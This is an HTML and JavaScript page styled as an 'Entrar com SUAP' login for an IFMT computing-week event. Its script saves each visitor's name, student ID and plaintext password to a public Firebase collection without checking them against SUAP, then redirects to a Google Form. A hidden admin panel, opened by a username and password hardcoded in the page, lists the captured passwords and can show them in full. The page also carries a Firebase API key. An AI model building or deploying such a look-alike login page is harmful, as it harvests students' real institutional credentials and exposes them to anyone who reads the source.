<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Autenticação - Semana da Informática</title>
    <!-- Incluindo o Tailwind CSS para estilização -->
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <!-- Usando a fonte Inter para um visual mais moderno -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        /* Aplicando a fonte Inter ao corpo da página */
        body {
            font-family: 'Inter', sans-serif;
            /* Definindo a imagem de fundo */
            background-image: url('https://online.ifmt.edu.br/pluginfile.php/1/theme_moove/loginbgimg/1753392594/sparkle.jpg');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
        }

        /* Paleta de cores personalizada baseada no logo */
        :root {
            --primary-color: #00bfff; /* Azul ciano brilhante do logo */
            --primary-color-dark: #00aadd; /* Tom mais escuro para hover */
        }

        .bg-primary { background-color: var(--primary-color); }
        .hover\:bg-primary-dark:hover { background-color: var(--primary-color-dark); }
        .text-primary { color: var(--primary-color); }
        .focus\:ring-primary:focus {
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(0 191 255 / var(--tw-ring-opacity));
             box-shadow: 0 0 0 2px white, 0 0 0 4px var(--primary-color);
        }
         .focus\:border-primary:focus {
            border-color: var(--primary-color);
        }
    </style>
</head>
<body>

    <!-- Container principal que centraliza o conteúdo na tela -->
    <div class="flex items-center justify-center min-h-screen p-4">

        <!-- Card principal que conterá todas as telas -->
        <div id="mainCard" class="w-full max-w-md bg-white/90 backdrop-blur-sm rounded-xl shadow-lg dark:bg-gray-800/90 overflow-hidden transition-all duration-300">

            <!-- TELA 1: Autenticação Inicial -->
            <div id="initialView" class="p-8 space-y-8">
                <!-- Título do Evento com Imagem -->
                <div class="text-center">
                    <img src="https://raw.githubusercontent.com/manoel-domingos/semana-informatica-login/refs/heads/main/semana%20informatica.png" alt="Logo Semana de Informática" class="mx-auto max-w-xs">
                </div>

                <!-- Seção dos botões -->
                <div class="text-center space-y-4">
                    <div>
                        <h2 class="text-xl font-medium text-gray-800 dark:text-white">Acesso para Alunos:</h2>
                        <button id="showLoginBtn" class="inline-flex items-center justify-center w-full px-4 py-3 mt-2 font-semibold text-gray-700 bg-white border border-gray-300 rounded-md shadow-sm hover:bg-gray-50 focus:outline-none focus:ring-primary transition-colors duration-200">
                             <img src="data:image/png;base64,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" alt="Logo SUAP" class="w-6 h-6 mr-3">
                            Entrar com SUAP
                        </button>
                    </div>
                    
                    <div class="relative">
                      <div class="absolute inset-0 flex items-center">
                        <span class="w-full border-t dark:border-gray-600"></span>
                      </div>
                      <div class="relative flex justify-center text-xs uppercase">
                        <span class="bg-white/90 px-2 text-gray-500 dark:bg-gray-800/90 dark:text-gray-400">
                          Ou
                        </span>
                      </div>
                    </div>

                    <div>
                        <h2 class="text-xl font-medium text-gray-800 dark:text-white">Acesso para Visitantes:</h2>
                        <button id="skipLoginBtn" type="button" class="w-full px-4 py-3 mt-2 font-semibold text-gray-700 bg-gray-100 rounded-md shadow-sm hover:bg-gray-200 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-gray-400 transition-colors duration-200 dark:bg-gray-700 dark:text-gray-200 dark:hover:bg-gray-600">
                            Não sou aluno
                        </button>
                    </div>
                </div>
                
                <hr class="dark:border-gray-600">

                <div class="flex items-center justify-between text-sm">
                    <a href="#" class="text-primary hover:underline dark:text-primary">Português - Brasil (pt_br) ✓</a>
                    <button id="showAdminBtn" class="px-3 py-1 text-gray-600 bg-gray-200 rounded-md dark:bg-gray-600 dark:text-gray-300">Admin</button>
                </div>
            </div>

            <!-- TELA 2: Formulário de Login (inicialmente escondida) -->
            <div id="loginView" class="p-8 hidden">
                <div class="text-center">
                    <img src="https://raw.githubusercontent.com/manoel-domingos/semana-informatica-login/refs/heads/main/semana%20informatica.png" alt="Logo Semana de Informática" class="mx-auto max-w-xs">
                    <p class="mt-4 text-sm text-gray-600 dark:text-gray-400">IFMT - SUAP - EVENTOS</p>
                </div>

                <form id="loginForm" class="space-y-6 mt-6">
                    <div>
                        <label for="name" class="text-sm font-medium text-gray-700 dark:text-gray-300">Nome</label>
                        <input id="name" name="name" type="text" required class="w-full px-3 py-2 mt-1 text-gray-900 bg-gray-50/70 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-primary focus:border-primary dark:bg-gray-700/70 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white" placeholder="Seu nome completo">
                    </div>
                    <div>
                        <label for="username" class="text-sm font-medium text-gray-700 dark:text-gray-300">Matrícula</label>
                        <input id="username" name="username" type="text" required class="w-full px-3 py-2 mt-1 text-gray-900 bg-gray-50/70 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-primary focus:border-primary dark:bg-gray-700/70 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white" placeholder="matrícula">
                    </div>
                    <div>
                        <label for="password" class="text-sm font-medium text-gray-700 dark:text-gray-300">Senha</label>
                        <input id="password" name="password" type="password" required class="w-full px-3 py-2 mt-1 text-gray-900 bg-gray-50/70 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-primary focus:border-primary dark:bg-gray-700/70 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white" placeholder="senha">
                    </div>
                    <div>
                        <button type="submit" class="w-full px-4 py-2 font-semibold text-white bg-primary rounded-md shadow-sm hover:bg-primary-dark focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-primary transition-colors duration-200">
                            Entrar
                        </button>
                    </div>
                </form>

                <div class="text-center mt-4">
                    <button id="backBtn" class="text-sm text-primary hover:underline dark:text-primary">← Voltar</button>
                </div>
            </div>

            <!-- TELA 4: Google Forms (inicialmente escondida) -->
            <div id="messageView" class="p-0 hidden h-full flex flex-col">
                <div class="text-center p-6 border-b dark:border-gray-600 flex justify-between items-center">
                    <div>
                        <h1 class="text-2xl font-bold text-gray-900 dark:text-white">Última Etapa</h1>
                        <p class="mt-1 text-gray-600 dark:text-gray-400">Por favor, responda o formulário.</p>
                    </div>
                    <button id="formBackBtn" class="text-sm text-primary hover:underline dark:text-primary">← Voltar</button>
                </div>
                <!-- AVISO: URL do Google Form ATUALIZADA com o código de incorporação correto -->
                <iframe 
                    src="https://docs.google.com/forms/d/e/1FAIpQLSep7jV5uffHLoQDL7IaCjjuwbndoQ8YAj87z6cXGaYaAtI22Q/viewform?embedded=true" 
                    class="w-full h-full"
                    frameborder="0" 
                    marginheight="0" 
                    marginwidth="0">
                    Carregando…
                </iframe>
            </div>


            <!-- NOVA TELA 5: Login de Admin (inicialmente escondida) -->
            <div id="adminLoginView" class="p-8 hidden">
                <div class="text-center">
                    <h1 class="text-3xl font-bold text-gray-900 dark:text-white">Acesso Administrativo</h1>
                    <p class="mt-2 text-sm text-gray-600 dark:text-gray-400">Insira suas credenciais.</p>
                </div>
                <form id="adminLoginForm" class="space-y-6 mt-6">
                    <div>
                        <label for="adminUsername" class="text-sm font-medium text-gray-700 dark:text-gray-300">Usuário Admin</label>
                        <input id="adminUsername" type="text" required class="w-full px-3 py-2 mt-1 text-gray-900 bg-gray-50/70 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-primary focus:border-primary dark:bg-gray-700/70 dark:border-gray-600 dark:text-white">
                    </div>
                    <div>
                        <label for="adminPassword" class="text-sm font-medium text-gray-700 dark:text-gray-300">Senha Admin</label>
                        <input id="adminPassword" type="password" required class="w-full px-3 py-2 mt-1 text-gray-900 bg-gray-50/70 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-primary focus:border-primary dark:bg-gray-700/70 dark:border-gray-600 dark:text-white">
                    </div>
                    <div id="adminError" class="text-sm text-red-600 dark:text-red-400 hidden">Credenciais inválidas.</div>
                    <div>
                        <button type="submit" class="w-full px-4 py-2 font-semibold text-white bg-primary rounded-md shadow-sm hover:bg-primary-dark focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-primary">Entrar como Admin</button>
                    </div>
                </form>
                 <div class="text-center mt-4">
                    <button id="adminBackBtn" class="text-sm text-primary hover:underline dark:text-primary">← Voltar</button>
                </div>
            </div>

            <!-- NOVA TELA 6: Painel do Admin (inicialmente escondida) -->
            <div id="adminDashboardView" class="p-8 hidden bg-[#2d3748] text-white">
                <!-- Cabeçalho do Painel -->
                <div class="flex justify-between items-start mb-6">
                    <div class="flex items-center space-x-4">
                        <div class="bg-purple-500 p-3 rounded-lg">
                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-white"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
                        </div>
                        <div>
                            <h1 class="text-2xl font-bold">Painel Administrativo</h1>
                            <p class="text-sm text-gray-400">Semana da Informática 2025</p>
                        </div>
                    </div>
                    <button id="logoutBtn" class="flex items-center space-x-2 px-3 py-2 text-sm font-medium text-white bg-red-500 rounded-md hover:bg-red-600 transition-colors">
                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"></path><polyline points="16 17 21 12 16 7"></polyline><line x1="21" y1="12" x2="9" y2="12"></line></svg>
                        <span>Sair</span>
                    </button>
                </div>

                <!-- Cards de Estatísticas -->
                <div class="grid grid-cols-1 sm:grid-cols-3 gap-4 mb-6">
                    <!-- Total -->
                    <div class="bg-gradient-to-br from-blue-400 to-blue-600 p-4 rounded-lg shadow-lg text-white">
                        <div class="flex justify-between items-center">
                            <div>
                                <p class="text-sm">Total de Tentativas</p>
                                <p id="totalCount" class="text-3xl font-bold">0</p>
                            </div>
                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="opacity-50"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M23 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path></svg>
                        </div>
                    </div>
                     <!-- Hoje -->
                    <div class="bg-gradient-to-br from-green-400 to-green-600 p-4 rounded-lg shadow-lg text-white">
                         <div class="flex justify-between items-center">
                            <div>
                                <p class="text-sm">Hoje</p>
                                <p id="todayCount" class="text-3xl font-bold">0</p>
                            </div>
                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="opacity-50"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
                        </div>
                    </div>
                     <!-- Última Hora -->
                    <div class="bg-gradient-to-br from-pink-500 to-purple-600 p-4 rounded-lg shadow-lg text-white">
                         <div class="flex justify-between items-center">
                            <div>
                                <p class="text-sm">Última Hora</p>
                                <p id="lastHourCount" class="text-3xl font-bold">0</p>
                            </div>
                           <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="opacity-50"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
                        </div>
                    </div>
                </div>

                <!-- Lista de Tentativas Recentes -->
                <div>
                    <h2 class="text-xl font-semibold mb-4">Tentativas de Login Recentes</h2>
                    <div class="space-y-4 max-h-64 overflow-y-auto pr-2" id="submissionsList">
                        <!-- Os dados dos usuários serão inseridos aqui -->
                        <p class="text-center text-gray-400">Carregando dados...</p>
                    </div>
                </div>
            </div>

        </div>
    </div>

    <script type="module">
        // =================================================================
        // INICIALIZAÇÃO DO FIREBASE
        // =================================================================
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
        import { getFirestore, collection, addDoc, serverTimestamp, query, getDocs } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";

        // SUAS CREDENCIAIS DO FIREBASE FORAM INSERIDAS AQUI.
        const firebaseConfig = {
            apiKey: "AIzaSyBolOsEoqjgLy5hCnVGUqcqA9yreHnRRIM",
            authDomain: "semana-informatia.firebaseapp.com",
            projectId: "semana-informatia",
            storageBucket: "semana-informatia.appspot.com",
            messagingSenderId: "413043577723",
            appId: "1:413043577723:web:b1896810cc69e06a52e3de",
            measurementId: "G-FPKSGRG02K"
        };
        
        const appId = firebaseConfig.projectId;

        let app;
        let auth;
        let db;

        try {
            app = initializeApp(firebaseConfig);
            auth = getAuth(app);
            db = getFirestore(app);
            await signInAnonymously(auth);
            console.log("Firebase inicializado e usuário anônimo autenticado.");
        } catch (error) {
            console.error("Erro ao inicializar o Firebase. Verifique suas credenciais e configurações.", error);
            if (error.code === 'auth/configuration-not-found') {
                 alert("Erro de Configuração: O método de login anônimo não está ativado no seu projeto Firebase. Por favor, vá até o Console do Firebase -> Authentication -> Sign-in method, e ative o provedor 'Anônimo'.");
            } else {
                alert("Não foi possível conectar ao servidor. A aplicação não funcionará corretamente. Verifique o console para mais detalhes.");
            }
        }
        
        // =================================================================
        // LÓGICA DA APLICAÇÃO
        // =================================================================
        const mainCard = document.getElementById('mainCard');
        const views = {
            initial: document.getElementById('initialView'),
            login: document.getElementById('loginView'),
            message: document.getElementById('messageView'),
            adminLogin: document.getElementById('adminLoginView'),
            adminDashboard: document.getElementById('adminDashboardView')
        };
        const showLoginBtn = document.getElementById('showLoginBtn');
        const backBtn = document.getElementById('backBtn');
        const loginForm = document.getElementById('loginForm');
        const skipLoginBtn = document.getElementById('skipLoginBtn');
        
        // Botão de voltar do formulário
        const formBackBtn = document.getElementById('formBackBtn');

        // ELEMENTOS DO ADMIN
        const showAdminBtn = document.getElementById('showAdminBtn');
        const adminBackBtn = document.getElementById('adminBackBtn');
        const adminLoginForm = document.getElementById('adminLoginForm');
        const adminError = document.getElementById('adminError');
        const logoutBtn = document.getElementById('logoutBtn');
        const submissionsList = document.getElementById('submissionsList');
        const totalCountEl = document.getElementById('totalCount');
        const todayCountEl = document.getElementById('todayCount');
        const lastHourCountEl = document.getElementById('lastHourCount');
        
        // Ícones para o toggle de senha
        const eyeOpenSVG = `<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"></path><circle cx="12" cy="12" r="3"></circle></svg>`;
        const eyeClosedSVG = `<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9.88 9.88a3 3 0 1 0 4.24 4.24"></path><path d="M10.73 5.08A10.43 10.43 0 0 1 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68"></path><path d="M6.61 6.61A13.526 13.526 0 0 0 2 12s3 7 10 7a9.74 9.74 0 0 0 5.39-1.61"></path><line x1="2" x2="22" y1="2" y2="22"></line></svg>`;

        // Função para trocar de tela
        const showView = (viewName) => {
            Object.values(views).forEach(view => view.classList.add('hidden'));
            
            // Lógica para redimensionar o card para a tela do formulário ou admin
            if (viewName === 'message' || viewName === 'adminDashboard') {
                mainCard.classList.remove('max-w-md');
                mainCard.classList.add('max-w-2xl');
                if(viewName === 'message') mainCard.classList.add('h-[90vh]');
                else mainCard.classList.remove('h-[90vh]');
            } else {
                mainCard.classList.remove('max-w-2xl', 'h-[90vh]');
                mainCard.classList.add('max-w-md');
            }

            if(views[viewName]) {
                views[viewName].classList.remove('hidden');
            }
        };

        // Navegação principal
        showLoginBtn.addEventListener('click', () => showView('login'));
        backBtn.addEventListener('click', () => showView('initial'));
        formBackBtn.addEventListener('click', () => showView('initial'));
        skipLoginBtn.addEventListener('click', () => showView('message'));

        // Navegação de Admin
        showAdminBtn.addEventListener('click', () => showView('adminLogin'));
        adminBackBtn.addEventListener('click', () => showView('initial'));
        logoutBtn.addEventListener('click', () => showView('initial'));

        // Lógica de Login do Usuário
        loginForm.addEventListener('submit', async function(event) {
            event.preventDefault();
            if (!db) {
                alert("Erro de conexão. Não é possível salvar os dados.");
                return;
            }
            const name = document.getElementById('name').value;
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value; 
            const submitButton = loginForm.querySelector('button[type="submit"]');
            submitButton.textContent = 'Enviando...';
            submitButton.disabled = true;

            try {
                const submissionsCollection = collection(db, `/artifacts/${appId}/public/data/submissions`);
                await addDoc(submissionsCollection, {
                    name: name,
                    username: username,
                    password_attempt: password, 
                    login_timestamp: serverTimestamp()
                });
                showView('message'); // Direto para o Google Forms
            } catch (error) {
                console.error("Erro ao salvar a tentativa de login: ", error);
                submitButton.textContent = 'Erro! Tente novamente.';
            } finally {
                submitButton.textContent = 'Entrar';
                submitButton.disabled = false;
            }
        });

        // Lógica de Login do Admin
        adminLoginForm.addEventListener('submit', async function(event) {
            event.preventDefault();
            const adminUsername = document.getElementById('adminUsername').value;
            const adminPassword = document.getElementById('adminPassword').value;

            if (adminUsername === 'manoel.neto' && adminPassword === 'Mala730591!') {
                adminError.classList.add('hidden');
                showView('adminDashboard');
                await fetchSubmissions();
            } else {
                adminError.classList.remove('hidden');
            }
        });

        // Buscar dados para o painel do Admin
        async function fetchSubmissions() {
             if (!db) {
                submissionsList.innerHTML = '<p class="text-center text-red-500">Erro de conexão com o banco de dados.</p>';
                return;
            }
            submissionsList.innerHTML = `<div class="text-center text-gray-400 py-8">
                <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round" class="mx-auto mb-2 opacity-50"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M23 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path></svg>
                Carregando dados...
            </div>`;
            try {
                const submissionsCollection = collection(db, `/artifacts/${appId}/public/data/submissions`);
                const q = query(submissionsCollection);
                const querySnapshot = await getDocs(q);
                
                submissionsList.innerHTML = ''; 
                
                if (querySnapshot.empty) {
                    submissionsList.innerHTML = `<div class="text-center text-gray-400 py-8">
                        <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round" class="mx-auto mb-2 opacity-50"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M23 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path></svg>
                        Nenhuma submissão encontrada ainda.
                    </div>`;
                    totalCountEl.textContent = 0;
                    todayCountEl.textContent = 0;
                    lastHourCountEl.textContent = 0;
                    return;
                }

                let todayCount = 0;
                let lastHourCount = 0;
                const now = new Date();
                const todayStart = new Date();
                todayStart.setHours(0, 0, 0, 0);
                const oneHourAgo = new Date(now.getTime() - 60 * 60 * 1000);

                querySnapshot.forEach((doc) => {
                    const data = doc.data();
                    
                    if (data.login_timestamp) {
                        const submissionDate = data.login_timestamp.toDate();
                        if (submissionDate >= todayStart) {
                            todayCount++;
                        }
                        if (submissionDate >= oneHourAgo) {
                            lastHourCount++;
                        }
                    }

                    const password = data.password_attempt || 'N/A';
                    const maskedPassword = password.substring(0, 3) + '***';

                    const card = `
                        <div class="bg-gray-800 p-3 rounded-lg flex justify-between items-center">
                            <div>
                                <p class="font-semibold text-white">${data.name || 'Nome não informado'}</p>
                                <p class="text-sm text-gray-400">Matrícula: ${data.username || 'N/A'}</p>
                                <p class="text-sm font-mono text-gray-400">
                                    Senha: <span class="password-text">${maskedPassword}</span>
                                </p>
                            </div>
                            <button class="toggle-password p-1 text-gray-400 hover:text-white" data-full-password="${password}" data-masked-password="${maskedPassword}">
                                ${eyeOpenSVG}
                            </button>
                        </div>
                    `;
                    submissionsList.innerHTML += card;
                });

                // Atualiza os contadores
                totalCountEl.textContent = querySnapshot.size;
                todayCountEl.textContent = todayCount;
                lastHourCountEl.textContent = lastHourCount;

            } catch (error) {
                console.error("Erro ao buscar submissões:", error);
                submissionsList.innerHTML = '<p class="text-center text-red-500">Erro ao carregar os dados.</p>';
            }
        }

        // Lógica para mostrar/ocultar senha no painel do admin
        submissionsList.addEventListener('click', function(event) {
            const toggleButton = event.target.closest('.toggle-password');
            if (!toggleButton) return;

            const passwordSpan = toggleButton.parentElement.querySelector('.password-text');
            const isMasked = passwordSpan.textContent === toggleButton.dataset.maskedPassword;

            if (isMasked) {
                passwordSpan.textContent = toggleButton.dataset.fullPassword;
                toggleButton.innerHTML = eyeClosedSVG;
            } else {
                passwordSpan.textContent = toggleButton.dataset.maskedPassword;
                toggleButton.innerHTML = eyeOpenSVG;
            }
        });

    </script>
</body>
</html>

